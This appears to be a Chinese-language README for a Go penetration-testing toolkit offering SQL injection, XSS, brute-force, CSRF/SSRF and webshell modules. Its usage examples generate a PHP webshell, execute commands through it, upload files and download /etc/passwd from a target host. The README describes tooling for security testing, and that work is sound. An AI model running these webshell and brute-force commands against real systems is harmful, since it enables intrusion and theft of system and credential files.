# Web Attack Toolkit

一个用于公司内部Web安全测试的综合工具集，使用Go语言开发。

## ⚠️ 重要声明

**本工具仅用于授权的安全测试、学习和研究目的。未经授权对系统进行安全测试是违法的。使用者需自行承担法律责任。**

## 功能模块

| 模块 | 命令 | 说明 |
|------|------|------|
| SQL注入检测 | `sqli` | 检测基于错误、布尔盲注、时间盲注、联合查询的SQL注入 |
| XSS检测 | `xss` | 检测反射型XSS，识别HTML/JS/属性等多种上下文 |
| Web漏洞扫描器 | `scan` | 综合扫描：目录发现、安全头、Cookie、CORS、信息泄露等 |
| 暴力破解 | `brute` | 表单/HTTP Basic/Digest 认证暴力破解 |
| CSRF/SSRF | `csrf-ssrf` | CSRF保护缺失检测 + SSRF漏洞测试 |
| WebShell管理 | `shell` | Shell管理、命令执行、文件上传下载、交互式会话 |

## 安装

```bash
# 克隆项目
cd webattack

# 安装依赖
go mod tidy

# 编译
go build -o webattack.exe .
```

## 使用示例

### SQL注入扫描
```bash
# 基础扫描
./webattack sqli -u "http://target.com/page.php?id=1"

# 带WAF检测
./webattack sqli -u "http://target.com/page.php?id=1" --waf -v

# 输出报告
./webattack sqli -u "http://target.com/page.php?id=1" -o report.txt
```

### XSS检测
```bash
./webattack xss -u "http://target.com/search.php?q=test" -v
```

### 综合漏洞扫描
```bash
./webattack scan -u "http://target.com" -v -o scan_report.txt
```

### 暴力破解
```bash
# 使用内置字典
./webattack brute -u "http://target.com/login.php" --type form

# 自定义字典和字段
./webattack brute -u "http://target.com/login.php" \
  -U payloads/usernames.txt -P payloads/passwords.txt \
  --user-field username --pass-field password \
  --success-str "Welcome" --fail-str "Invalid" \
  -t 10 --rate 20

# HTTP Basic认证
./webattack brute -u "http://target.com/admin" --type basic
```

### CSRF/SSRF
```bash
./webattack csrf-ssrf -u "http://target.com/profile.php"
```

### WebShell管理
```bash
# 生成Shell
./webattack shell generate --type php -p mypass -o shell.php

# 添加Shell
./webattack shell add -u "http://target.com/shell.php" --name "target1" -p mypass

# 列出所有Shell
./webattack shell list

# 执行命令
./webattack shell exec -i 0 -c "whoami"

# 检查Shell存活
./webattack shell check

# 上传文件
./webattack shell upload -i 0 -l local.txt -r /var/www/html/uploaded.txt

# 下载文件
./webattack shell download -i 0 -r /etc/passwd -l passwd.txt

# 交互式会话
./webattack shell interact -i 0
```

## 全局参数

| 参数 | 说明 |
|------|------|
| `-u, --url` | 目标URL |
| `-v, --verbose` | 详细输出 |
| `--proxy` | HTTP代理 (如 `http://127.0.0.1:8080`) |
| `--timeout` | 请求超时(秒) |
| `--user-agent` | 自定义User-Agent |
| `-o, --output` | 输出报告文件 |
| `-t, --threads` | 并发线程数 |

## 项目结构

```
webattack/
├── main.go                 # 主入口 + CLI
├── go.mod                  # Go模块定义
├── pkg/
│   ├── httpclient/         # HTTP客户端封装
│   │   └── client.go
│   ├── payloads/           # 攻击载荷库
│   │   └── payloads.go
│   ├── utils/              # 工具函数
│   │   └── utils.go
│   ├── sqli/               # SQL注入扫描器
│   │   └── scanner.go
│   ├── xss/                # XSS扫描器
│   │   └── scanner.go
│   ├── scanner/            # Web漏洞扫描器
│   │   └── scanner.go
│   ├── brute/              # 暴力破解引擎
│   │   └── brute.go
│   ├── csrfssrf/           # CSRF/SSRF扫描器
│   │   └── csrf_ssrf.go
│   └── shell/              # WebShell管理器
│       └── shell.go
└── payloads/               # 字典文件
    ├── usernames.txt
    └── passwords.txt
```

## 技术特性

- **并发扫描**: 支持多线程并发，提高扫描效率
- **速率限制**: 可配置请求速率，避免触发WAF
- **代理支持**: 支持HTTP代理，可配合Burp Suite等工具
- **WAF检测**: 自动识别常见WAF产品
- **上下文感知**: XSS扫描器能识别不同的注入上下文
- **多种认证**: 支持表单、Basic、Digest认证爆破
- **报告生成**: 自动生成详细的测试报告
